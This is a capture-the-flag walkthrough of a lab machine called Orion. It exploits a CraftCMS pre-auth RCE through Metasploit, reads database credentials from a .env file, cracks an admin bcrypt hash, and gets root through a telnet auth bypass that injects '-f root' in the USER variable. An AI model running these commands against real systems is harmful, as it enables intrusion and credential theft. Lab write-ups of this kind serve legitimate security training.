# Orion: Easy

```sh
sudo vim /etc/hosts
# add 'orion.htb'

nmap -T4 -p- -A -Pn -v orion.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
    * 80/tcp: http: nginx 1.18.0

* the webpage is for 'Orion Telecom': a company providing connectivity services

* the webpage footer shows that it is powered by 'CraftCMS'

* there's also a contact form on the landing page, but it does not do anything

* there are no outgoing links, and source code does not reveal anything; we can check further using web enumeration:

    ```sh
    gobuster dir -u http://orion.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js -t 25
    # dir scan using small wordlist

    ffuf -c -u 'http://orion.htb' -H 'Host: FUZZ.orion.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    # subdomain scan
    ```

* directory scan using ```gobuster``` gives us a new directory '/admin'

* checking the '/admin' page leads to a login page at '/admin/login', for 'Orion Telecom Administration: Internal Website Management Portal'

* the login page footer shows the version info 'Craft CMS 5.6.16'

* Googling for exploits associated with CraftCMS 5.6.16 leads to [CVE-2025-32432: a pre-authentication RCE vuln](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)

* [this blog post explains the vuln](https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/)

* Metasploit has a module included for this exploit, so we can try it out:

    ```sh
    msfconsole -q

    search cve-2025-32432

    use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

    options

    set RHOSTS orion.htb

    set LHOST tun0

    run
    # the exploit works

    # we get a meterpreter shell

    # drop into a shell
    shell
    ```

* as we have RCE now, we can check for any secrets:

    ```sh
    # in shell

    id
    # 'www-data' user

    pwd
    # '/var/www/html/craft/web'

    ls -la

    ls -la /var/www
    # check web dir for any secrets

    ls -la /var/www/html

    ls -la /var/www/html/craft
    # check all files

    cat /var/www/html/craft/.env
    ```

* the file ```/var/www/html/craft/.env``` discloses the MySQL DB creds 'root:SuperSecureCraft123Pass!' for the DB 'orion'

* we can check the DB for any secrets:

    ```sh
    mysql -u root -p'SuperSecureCraft123Pass!' -e 'show databases'
    # this shows the 'orion' database

    mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'show tables'
    # we have a 'users' table

    mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'select * from users'
    ```

* checking the 'users' table from the 'orion' DB gives us an user entry for username 'admin', with email 'adam@orion.htb', and the following password hash: ```$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS```

* online hash identifier tools show that it is a bcrypt hash, corresponding to ```hashcat``` mode 3200

* we can try to crack the hash:

    ```sh
    # on attacker

    vim adminhash
    # paste hash

    hashcat -a 0 -m 3200 adminhash /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` cracks the password to give us the cleartext 'darkangel'

* we can enumerate the system further for any other secrets:

    ```sh
    # on target

    ls -la /

    ls -la /home
    # we have a single user 'adam'
    # no read access
    ```

* as we have an existing user 'adam' on the box, we can try logging in via SSH using the creds 'adam:darkangel':

    ```sh
    ssh adam@orion.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # user cannot run sudo
    ```

* we can try using ```linpeas``` for basic enum: fetch the script from attacker:

    ```sh
    wget http://10.10.14.200:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.15.0-177-generic, Ubuntu 22.04.5
    * sudo version 1.9.9
    * local-only listeners shows ports 23 and 3306

* the ```telnet``` service is running on localhost on port 23: we can check for any info:

    ```sh
    telnet localhost 23
    # this works with the same creds
    # but just leads to 'adam' login

    exit

    telnet --version
    ```

* the box is running ```telnet``` version 2.7: we can check for any exploits associated with this

* checking for any vulns for telnet 2.7 leads to [CVE-2026-24061: an auth bypass vuln](https://www.offsec.com/blog/cve-2026-24061/)

* we can follow the given POC to try logging in as root:

    ```sh
    USER='-f root' telnet -a localhost
    # this works and we have root shell

    cat /root/root.txt
    # root flag
    ```
